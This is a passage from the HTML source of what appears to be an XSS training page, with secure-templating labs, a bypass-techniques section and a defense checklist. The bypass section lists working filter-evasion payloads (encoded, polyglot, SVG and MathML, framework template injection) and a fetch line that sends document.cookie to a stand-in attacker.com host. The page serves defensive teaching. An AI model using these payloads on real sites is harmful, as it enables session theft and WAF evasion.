    <span class="code-tag">&lt;li&gt;</span><span class="code-tag">&lt;%=</span> c.content <span class="code-tag">%&gt;</span><span class="code-tag">&lt;/li&gt;</span>  <span class="code-comment">&lt;!-- Auto-escaped --&gt;</span>
  <span class="code-tag">&lt;%</span> }); <span class="code-tag">%&gt;</span>
<span class="code-tag">&lt;/ul&gt;</span>

<span class="code-comment">// If you must allow HTML (rich text), use DOMPurify:</span>
<span class="code-keyword">const</span> createDOMPurify = <span class="code-function">require</span>(<span class="code-string">'dompurify'</span>);
<span class="code-keyword">const</span> { JSDOM } = <span class="code-function">require</span>(<span class="code-string">'jsdom'</span>);
<span class="code-keyword">const</span> DOMPurify = <span class="code-function">createDOMPurify</span>(<span class="code-keyword">new</span> <span class="code-function">JSDOM</span>(<span class="code-string">''</span>).window);

<span class="code-keyword">const</span> clean = DOMPurify.<span class="code-function">sanitize</span>(dirtyHtmlInput);</code></pre>
        </div>

        <h3 class="subsection-title">Lab 3: DOM-Based XSS Prevention</h3>
        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">❌ Vulnerable JavaScript</span></div>
          <pre><code><span class="code-comment">// Vulnerable: Using innerHTML with user-controlled data</span>
<span class="code-keyword">const</span> userLang = <span class="code-attr">location.hash</span>.<span class="code-function">split</span>(<span class="code-string">'#'</span>)[<span class="code-keyword">1</span>] || <span class="code-string">'en'</span>;
<span class="code-attr">document.getElementById</span>(<span class="code-string">'welcome'</span>).<span class="code-attr">innerHTML</span> = 
    <span class="code-string">`&lt;h1&gt;Welcome, traveler from ${userLang}&lt;/h1&gt;`</span>;  <span class="code-comment">// XSS!</span>

<span class="code-comment">// Other dangerous sinks:</span>
<span class="code-function">document.write</span>(userInput);
<span class="code-function">eval</span>(userInput);
<span class="code-attr">element.outerHTML</span> = userInput;
<span class="code-function">setTimeout</span>(userInput, <span class="code-keyword">100</span>);</code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure JavaScript</span></div>
          <pre><code><span class="code-comment">// Safe: Using textContent instead of innerHTML</span>
<span class="code-keyword">const</span> userLang = <span class="code-attr">location.hash</span>.<span class="code-function">split</span>(<span class="code-string">'#'</span>)[<span class="code-keyword">1</span>] || <span class="code-string">'en'</span>;
<span class="code-attr">document.getElementById</span>(<span class="code-string">'welcome'</span>).<span class="code-attr">textContent</span> = 
    <span class="code-string">`Welcome, traveler from `</span> + userLang;

<span class="code-comment">// Alternative: Create elements safely</span>
<span class="code-keyword">const</span> h1 = <span class="code-attr">document.createElement</span>(<span class="code-string">'h1'</span>);
h1.<span class="code-attr">textContent</span> = <span class="code-string">'Welcome, traveler from '</span> + userLang;
<span class="code-attr">document.getElementById</span>(<span class="code-string">'welcome'</span>).<span class="code-function">appendChild</span>(h1);

<span class="code-comment">// If you must set HTML, use DOMPurify client-side:</span>
<span class="code-keyword">import</span> DOMPurify <span class="code-keyword">from</span> <span class="code-string">'dompurify'</span>;
<span class="code-attr">element.innerHTML</span> = DOMPurify.<span class="code-function">sanitize</span>(userInput);</code></pre>
        </div>

        <h3 class="subsection-title">Lab 4: Python/Flask Secure Templates</h3>
        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Flask with Jinja2 Auto-Escaping</span></div>
          <pre><code><span class="code-keyword">from</span> flask <span class="code-keyword">import</span> Flask, render_template, request
<span class="code-keyword">from</span> markupsafe <span class="code-keyword">import</span> Markup

app = Flask(__name__)

<span class="code-comment"># Jinja2 auto-escapes by default - SAFE</span>
<span class="code-keyword">@app.route</span>(<span class="code-string">'/search'</span>)
<span class="code-keyword">def</span> <span class="code-function">search</span>():
    query = request.args.get(<span class="code-string">'q'</span>, <span class="code-string">''</span>)
    <span class="code-keyword">return</span> render_template(<span class="code-string">'search.html'</span>, query=query)

<span class="code-comment"># Template (search.html):</span>
<span class="code-comment"># &lt;p&gt;Results for: {{ query }}&lt;/p&gt;  &lt;!-- Auto-escaped --&gt;</span>

<span class="code-comment"># If you need to mark something as safe (rarely needed):</span>
<span class="code-keyword">@app.route</span>(<span class="code-string">'/safe-html'</span>)
<span class="code-keyword">def</span> <span class="code-function">safe_html</span>():
    <span class="code-comment"># Only use Markup() with trusted, sanitized content!</span>
    clean_html = <span class="code-function">sanitize_with_bleach</span>(user_input)
    <span class="code-keyword">return</span> render_template(<span class="code-string">'page.html'</span>, content=Markup(clean_html))

<span class="code-comment"># Using bleach for HTML sanitization:</span>
<span class="code-keyword">import</span> bleach

<span class="code-keyword">def</span> <span class="code-function">sanitize_with_bleach</span>(dirty):
    <span class="code-keyword">return</span> bleach.<span class="code-function">clean</span>(
        dirty,
        tags=[<span class="code-string">'p'</span>, <span class="code-string">'br'</span>, <span class="code-string">'strong'</span>, <span class="code-string">'em'</span>],
        attributes={},
        strip=<span class="code-keyword">True</span>
    )</code></pre>
        </div>
      </div>

      <div id="bypass" class="content-card">
        <h2 class="card-title"><i>🚧</i> XSS Bypass Techniques</h2>

        <p class="text-content">
          Attackers employ various techniques to bypass XSS filters and Web Application Firewalls (WAFs). Understanding
          these helps in building robust defenses [^24^] [^34^] [^35^].
        </p>

        <h3 class="subsection-title">1. Case Variation and Encoding</h3>
        <p class="text-content">
          Many filters use case-sensitive pattern matching. Attackers exploit this with mixed-case payloads and various
          encoding schemes.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Case and Encoding Bypasses</span></div>
          <pre><code><span class="code-comment">-- Case variation bypass</span>
<span class="code-tag">&lt;ScRiPt&gt;</span>alert(1)<span class="code-tag">&lt;/sCrIpT&gt;</span>
<span class="code-tag">&lt;IMG SRC=X ONERROR=ALERT(1)&gt;</span>

<span class="code-comment">-- HTML entity encoding (decimal)</span>
<span class="code-tag">&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&gt;</span>

<span class="code-comment">-- HTML entity encoding (hexadecimal)</span>
<span class="code-tag">&lt;img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&gt;</span>

<span class="code-comment">-- URL encoding</span>
<span class="code-string">%3Cscript%3Ealert(1)%3C/script%3E</span>

<span class="code-comment">-- Unicode normalization</span>
<span class="code-tag">&lt;img src=x onerror=alert&#40;1&#41;&gt;</span>  <span class="code-comment">-- Parentheses as entities</span></code></pre>
        </div>

        <h3 class="subsection-title">2. Alternative Event Handlers</h3>
        <p class="text-content">
          When common events like <code>onerror</code> or <code>onclick</code> are blocked, attackers use lesser-known
          event handlers [^24^].
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Alternative Event Handlers</span></div>
          <pre><code><span class="code-tag">&lt;input autofocus onbeforeinput='alert(1)'&gt;</span>
<span class="code-tag">&lt;input autofocus onbeforeinput='alert(1)'&gt;</span>
<span class="code-tag">&lt;input autofocus onfocusin='alert(1)'&gt;</span>
<span class="code-tag">&lt;input autofocus onfocusout='alert(1)'&gt;</span>
<span class="code-tag">&lt;input onpointerenter='alert(1)'&gt;</span>
<span class="code-tag">&lt;input onpointerleave='alert(1)'&gt;</span>
<span class="code-tag">&lt;input onpointerrawupdate='alert(1)'&gt;</span>
<span class="code-tag">&lt;input onbeforetoggle='alert(1)'&gt;</span>
<span class="code-tag">&lt;input ontoggle='alert(1)'&gt;</span>
<span class="code-tag">&lt;img src=x onerror='alert(1)'&gt;</span>
<span class="code-tag">&lt;video oncanplay='alert(1)'&gt;&lt;source src='x'&gt;&lt;/video&gt;</span>
<span class="code-tag">&lt;audio oncanplay='alert(1)'&gt;&lt;source src='x'&gt;&lt;/audio&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">3. Template Literal Injection</h3>
        <p class="text-content">
          In JavaScript template literal contexts, attackers can inject expressions that execute arbitrary code.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Template Literal Exploitation</span></div>
          <pre><code><span class="code-comment">-- If injection point is inside a template literal:</span>
<span class="code-keyword">var</span> msg = <span class="code-string">`Hello ${USER_INPUT}`</span>;

<span class="code-comment">-- Payload: ${alert(1)}</span>
<span class="code-comment">-- Result: var msg = `Hello ${alert(1)}`;</span>

<span class="code-comment">-- More dangerous - function execution:</span>
<span class="code-keyword">var</span> msg = <span class="code-string">`Hello ${fetch('https://attacker.com/steal?c='+document.cookie)}`</span>;

<span class="code-comment">-- Array constructor exploitation:</span>
<span class="code-keyword">var</span> arr = [USER_INPUT];
<span class="code-comment">-- Payload: alert(1)]; //</span>
<span class="code-comment">-- Result: var arr = [alert(1)]; //];</span></code></pre>
        </div>

        <h3 class="subsection-title">4. WAF Bypass Strategies</h3>
        <p class="text-content">
          Modern WAFs use pattern matching and behavioral analysis. Attackers fragment payloads and use polyglots to
          evade detection [^35^].
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Advanced WAF Bypass</span></div>
          <pre><code><span class="code-comment">-- Polyglot payload (works in multiple contexts)</span>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */<span class="code-function">alert</span>(/<span class="code-string">*/</span>)/<span class="code-string">*/</span>)<span class="code-comment">//&lt;/script&gt;</span>

<span class="code-comment">-- SVG with foreignObject (bypasses HTML-only filters)</span>
<span class="code-tag">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;</span>
  <span class="code-tag">&lt;foreignObject width="100%" height="100%"&gt;</span>
    <span class="code-tag">&lt;body xmlns="http://www.w3.org/1999/xhtml"&gt;</span>
      <span class="code-tag">&lt;script&gt;</span>alert(1)<span class="code-tag">&lt;/script&gt;</span>
    <span class="code-tag">&lt;/body&gt;</span>
  <span class="code-tag">&lt;/foreignObject&gt;</span>
<span class="code-tag">&lt;/svg&gt;</span>

<span class="code-comment">-- MathML mtext parsing trick</span>
<span class="code-tag">&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert(1)&gt;</span>

<span class="code-comment">-- Using data: URI with base64</span>
<span class="code-tag">&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;</span>

<span class="code-comment">-- JavaScript protocol with Unicode</span>
<span class="code-tag">&lt;a href="javascript:\u0061\u006c\u0065\u0072\u0074(1)"&gt;Click&lt;/a&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">5. Framework-Specific Bypasses</h3>
        <p class="text-content">
          Modern JavaScript frameworks have specific bypass vectors that attackers target [^30^].
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">React/Angular/Vue Bypasses</span></div>
          <pre><code><span class="code-comment">-- React dangerouslySetInnerHTML bypass</span>
<span class="code-tag">&lt;div</span> <span class="code-attr">dangerouslySetInnerHTML</span>={{<span class="code-attr">__html</span>: userInput}} <span class="code-tag">/&gt;</span>

<span class="code-comment">-- React href bypass (user input in href)</span>
<span class="code-tag">&lt;a href={userInput}&gt;Link&lt;/a&gt;</span>
<span class="code-comment">-- Payload: javascript:alert(1)</span>

<span class="code-comment">-- Angular [innerHTML] bypass</span>
<span class="code-tag">&lt;div [innerHTML]="userInput"&gt;&lt;/div&gt;</span>

<span class="code-comment">-- Vue v-html directive</span>
<span class="code-tag">&lt;div v-html="userInput"&gt;&lt;/div&gt;</span>

<span class="code-comment">-- Angular template injection (advanced)</span>
<span class="code-tag">&lt;div&gt;{{constructor.constructor('alert(1)')()}}&lt;/div&gt;</span></code></pre>
        </div>
      </div>

      <div id="mitigation" class="content-card">
        <h2 class="card-title"><i>🛡️</i> XSS Prevention Checklist: Defense in Depth</h2>

        <div class="highlight-box">
          <strong>Golden Rule:</strong> Never trust user input. Encode all output based on context, implement Content
          Security Policy, use modern frameworks with auto-escaping, and assume all user input is malicious. XSS
          prevention requires defense at multiple layers.
        </div>

        <h3 class="subsection-title">Layer 1: Context-Aware Output Encoding</h3>
        <p class="text-content">
          The foundation of XSS prevention is proper output encoding. The encoding must match the context where data is
          inserted [^28^].
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Encoding by Context</span></div>
          <pre><code><span class="code-comment">-- HTML Body Context</span>
<span class="code-function">htmlspecialchars</span>(<span class="code-keyword">$data</span>, <span class="code-keyword">ENT_QUOTES</span>, <span class="code-string">'UTF-8'</span>);

<span class="code-comment">-- HTML Attribute Context (always quote attributes)</span>
<span class="code-tag">&lt;input value="&lt;?= htmlspecialchars($data, ENT_QUOTES, 'UTF-8') ?&gt;"&gt;</span>

<span class="code-comment">-- JavaScript Context</span>
<span class="code-keyword">var</span> name = <span class="code-function">JSON.stringify</span>(<span class="code-keyword">$data</span>);  <span class="code-comment">-- Ensures proper string escaping</span>

<span class="code-comment">-- CSS Context</span>
<span class="code-comment">-- Strict whitelist of allowed characters/values</span>
<span class="code-keyword">if</span> (!<span class="code-function">preg_match</span>(<span class="code-string">'/^[a-zA-Z0-9\s\-#]+$/</span>', <span class="code-keyword">$color</span>)) {
    <span class="code-keyword">$color</span> = <span class="code-string">'black'</span>;  <span class="code-comment">-- Default safe value</span>
}

<span class="code-comment">-- URL Context</span>
<span class="code-function">urlencode</span>(<span class="code-keyword">$data</span>);  <span class="code-comment">-- For query parameters</span>
<span class="code-function">filter_var</span>(<span class="code-keyword">$url</span>, <span class="code-function">FILTER_VALIDATE_URL</span>);  <span class="code-comment">-- Validate URL scheme</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 2: Content Security Policy (CSP)</h3>
        <p class="text-content">
          CSP is a browser security mechanism that helps prevent XSS by controlling resources the browser is allowed to
          load [^29^].
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Strict CSP Implementation</span></div>
          <pre><code><span class="code-comment">-- HTTP Header</span>
<span class="code-attr">Content-Security-Policy</span>: <span class="code-string">
default-src 'self';
script-src 'self' 'nonce-abc123' 'strict-dynamic';
style-src 'self' 'unsafe-inline';
img-src 'self' data: https:;
font-src 'self';
connect-src 'self';
media-src 'self';
object-src 'none';
frame-src 'none';
base-uri 'self';
form-action 'self';
upgrade-insecure-requests;
block-all-mixed-content;
</span>

<span class="code-comment">-- Nonce-based script execution (recommended)</span>
<span class="code-comment">-- Server generates random nonce for each request:</span>
<span class="code-tag">&lt;script nonce="abc123"&gt;</span>console.log('Trusted script')<span class="code-tag">&lt;/script&gt;</span>

<span class="code-comment">-- Hash-based CSP (for inline scripts)</span>
<span class="code-attr">script-src</span> <span class="code-string">'sha256-abc123...'</span>;

<span class="code-comment">-- Reporting violations</span>
<span class="code-attr">Content-Security-Policy-Report-Only</span>: <span class="code-string">...; report-uri /csp-report</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 3: Secure Cookies</h3>
        <p class="text-content">
          Prevent cookie theft via XSS using HttpOnly and Secure flags [^28^].
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Secure Cookie Configuration</span></div>
          <pre><code><span class="code-comment">-- PHP</span>
<span class="code-function">setcookie</span>(<span class="code-string">'session_id'</span>, <span class="code-keyword">$token</span>, [
    <span class="code-string">'expires'</span> => <span class="code-keyword">time</span>() + <span class="code-keyword">3600</span>,
    <span class="code-string">'path'</span> => <span class="code-string">'/'</span>,
    <span class="code-string">'domain'</span> => <span class="code-string">'.example.com'</span>,
    <span class="code-string">'secure'</span> => <span class="code-keyword">true</span>,           <span class="code-comment">-- HTTPS only</span>
    <span class="code-string">'httponly'</span> => <span class="code-keyword">true</span>,        <span class="code-comment">-- JavaScript cannot access!</span>
    <span class="code-string">'samesite'</span> => <span class="code-string">'Strict'</span>       <span class="code-comment">-- CSRF protection</span>
]);

<span class="code-comment">-- Node.js/Express</span>
res.<span class="code-function">cookie</span>(<span class="code-string">'session'</span>, token, {
    maxAge: <span class="code-keyword">3600000</span>,
    httpOnly: <span class="code-keyword">true</span>,
    secure: <span class="code-keyword">true</span>,
    sameSite: <span class="code-string">'strict'</span>
});</code></pre>
        </div>

        <h3 class="subsection-title">Layer 4: Modern Framework Protections</h3>
        <p class="text-content">
          Use frameworks that auto-escape by default and avoid dangerous patterns.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Framework Security Patterns</span></div>
          <pre><code><span class="code-comment">-- React (auto-escapes JSX)</span>
<span class="code-comment">-- Safe:</span>
<span class="code-tag">&lt;div&gt;</span>{userInput}<span class="code-tag">&lt;/div&gt;</span>  <span class="code-comment">-- Auto-escaped</span>

<span class="code-comment">-- Dangerous (avoid):</span>
<span class="code-tag">&lt;div</span> <span class="code-attr">dangerouslySetInnerHTML</span>={{<span class="code-attr">__html</span>: userInput}} <span class="code-tag">/&gt;</span>

<span class="code-comment">-- If HTML must be rendered, sanitize first:</span>
<span class="code-keyword">import</span> DOMPurify <span class="code-keyword">from</span> <span class="code-string">'dompurify'</span>;
<span class="code-tag">&lt;div</span> <span class="code-attr">dangerouslySetInnerHTML</span>={{<span class="code-attr">__html</span>: DOMPurify.sanitize(userInput)}} <span class="code-tag">/&gt;</span>

<span class="code-comment">-- Vue.js</span>
<span class="code-comment">-- Safe (mustache syntax):</span>
<span class="code-tag">&lt;div&gt;</span>{{ userInput }}<span class="code-tag">&lt;/div&gt;</span>  <span class="code-comment">-- Auto-escaped</span>

<span class="code-comment">-- Dangerous:</span>
<span class="code-tag">&lt;div v-html="userInput"&gt;&lt;/div&gt;</span>

<span class="code-comment">-- Angular</span>
<span class="code-comment">-- Safe (interpolation):</span>
<span class="code-tag">&lt;div&gt;</span>{{ userInput }}<span class="code-tag">&lt;/div&gt;</span>  <span class="code-comment">-- Auto-escaped</span>

<span class="code-comment">-- Dangerous:</span>
<span class="code-tag">&lt;div [innerHTML]="userInput"&gt;&lt;/div&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 5: Input Validation and Sanitization</h3>
        <p class="text-content">
          While output encoding is primary, input validation adds defense-in-depth.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Input Validation Patterns</span></div>
          <pre><code><span class="code-comment">-- Whitelist approach (preferred)</span>
<span class="code-keyword">$allowed_tags</span> = [<span class="code-string">'p'</span>, <span class="code-string">'br'</span>, <span class="code-string">'strong'</span>, <span class="code-string">'em'</span>, <span class="code-string">'a'</span>];
<span class="code-keyword">$clean</span> = <span class="code-function">strip_tags</span>(<span class="code-keyword">$input</span>, <span class="code-keyword">implode</span>(<span class="code-string">''</span>, <span class="code-keyword">$allowed_tags</span>));

<span class="code-comment">-- HTML Purifier (comprehensive sanitization)</span>
<span class="code-keyword">$config</span> = HTMLPurifier_Config::<span class="code-function">createDefault</span>();
<span class="code-keyword">$purifier</span> = <span class="code-keyword">new</span> <span class="code-function">HTMLPurifier</span>(<span class="code-keyword">$config</span>);
<span class="code-keyword">$clean_html</span> = <span class="code-keyword">$purifier</span>-><span class="code-function">purify</span>(<span class="code-keyword">$dirty_html</span>);

<span class="code-comment">-- URL validation</span>
<span class="code-keyword">if</span> (!<span class="code-function">filter_var</span>(<span class="code-keyword">$url</span>, <span class="code-function">FILTER_VALIDATE_URL</span>) || 
    <span class="code-function">parse_url</span>(<span class="code-keyword">$url</span>, <span class="code-function">PHP_URL_SCHEME</span>) !== <span class="code-string">'https'</span>) {
    <span class="code-keyword">$url</span> = <span class="code-string">'https://default.example.com'</span>;
}</code></pre>
        </div>

        <h3 class="subsection-title">Layer 6: Security Headers</h3>
        <p class="text-content">
          Complement CSP with additional security headers to harden the browser environment.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Security Headers Configuration</span></div>
          <pre><code><span class="code-comment">-- X-Content-Type-Options</span>
<span class="code-attr">X-Content-Type-Options</span>: <span class="code-string">nosniff</span>  <span class="code-comment">-- Prevents MIME type sniffing</span>

<span class="code-comment">-- X-Frame-Options</span>
<span class="code-attr">X-Frame-Options</span>: <span class="code-string">DENY</span>  <span class="code-comment">-- Prevents clickjacking</span>

<span class="code-comment">-- Referrer-Policy</span>
<span class="code-attr">Referrer-Policy</span>: <span class="code-string">strict-origin-when-cross-origin</span>

<span class="code-comment">-- Permissions-Policy (formerly Feature-Policy)</span>
<span class="code-attr">Permissions-Policy</span>: <span class="code-string">camera=(), microphone=(), geolocation=()</span>

<span class="code-comment">-- Strict-Transport-Security (HSTS)</span>
<span class="code-attr">Strict-Transport-Security</span>: <span class="code-string">max-age=31536000; includeSubDomains; preload</span></code></pre>
        </div>

        <h3 class="subsection-title">Security Checklist Summary</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Defense Layer</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Implementation</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--text-secondary);">Priority</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Output Encoding</td>
              <td style="padding: 0.75rem;">htmlspecialchars(), JSON.stringify(), context-aware encoding</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Content Security Policy</td>
              <td style="padding: 0.75rem;">Strict CSP with nonces, no 'unsafe-inline'</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">HttpOnly Cookies</td>
              <td style="padding: 0.75rem;">Set HttpOnly, Secure, SameSite flags</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Framework Auto-Escaping</td>
              <td style="padding: 0.75rem;">Use React/Vue/Angular defaults, avoid dangerous APIs</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Input Validation</td>
              <td style="padding: 0.75rem;">Whitelist validation, HTML Purifier for rich text</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Security Headers</td>
              <td style="padding: 0.75rem;">X-Content-Type-Options, X-Frame-Options, HSTS</td>
              <td style="padding: 0.75rem;">Medium</td>
            </tr>
          </table>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: Implementing Defense in Depth for XSS</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Complete XSS protection implementation walkthrough]
          </div>
        </div>
      </div>

    </main>
  </div>

  <script>
  function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    sidebar.style.transform = sidebar.style.transform === 'translateX(0%)' ? 'translateX(-100%)' : 'translateX(0%)';
  }

  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) {
        target.scrollIntoView({
          behavior: 'smooth',
          block: 'start'
        });
      }
    });
  });

  function copyCode(btn) {
    const codeBlock = btn.closest('.code-block').querySelector('pre');
    const text = codeBlock.textContent;
    navigator.clipboard.writeText(text).then(() => {
      btn.textContent = '✅ Copied!';
      setTimeout(() => btn.textContent = '📋 Copy', 2000);
    });
  }
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>


</html>